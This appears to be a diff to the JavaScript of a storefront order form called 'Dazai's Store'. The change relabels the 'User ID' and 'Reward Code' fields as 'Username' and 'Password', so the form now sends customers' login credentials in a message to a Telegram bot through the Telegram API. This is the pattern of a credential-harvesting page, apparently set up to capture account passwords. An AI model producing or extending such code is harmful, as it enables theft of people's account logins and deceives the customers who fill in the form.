@@ -308,8 +308,8 @@
       const msg = `🛒 New Order from Dazai's Store\n\n` +
                   `👤 ${customer}\n` +
                   `⭐ ${selectedPlan} — ${selectedDays} Days\n\n` +
-                  `🆔 User ID : ${userId}\n` +
-                  `🎟️ Reward Code : ${document.getElementById('rewardCode').value.trim() || "None"}\n` +
+                  `🆔 Username : ${userId}\n` +
+                  `🎟️ Password : ${document.getElementById('rewardCode').value.trim() || "None"}\n` +
                   `📝 Note : ${document.getElementById('note').value.trim() || "No note"}`;
 
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
